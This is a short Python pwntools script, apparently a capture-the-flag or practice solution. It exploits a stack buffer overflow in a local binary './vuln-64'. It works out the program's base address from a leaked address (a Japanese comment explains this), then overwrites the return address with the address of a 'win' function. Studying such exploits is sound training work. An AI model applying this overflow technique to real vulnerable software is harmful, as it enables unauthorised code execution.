from pwn import *

elf = context.binary = ELF('./vuln-64')
p = process('./vuln-64')

p.clean()
p.sendline(b'AAAA')

# 実行時にスタックを覗いてそれっぽいアドレスと相対アドレスを見つけてきた
elf.address = 0x55555555518a - 0x118a

payload = b'A' * 40
payload += p64(elf.sym['win'])

p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))
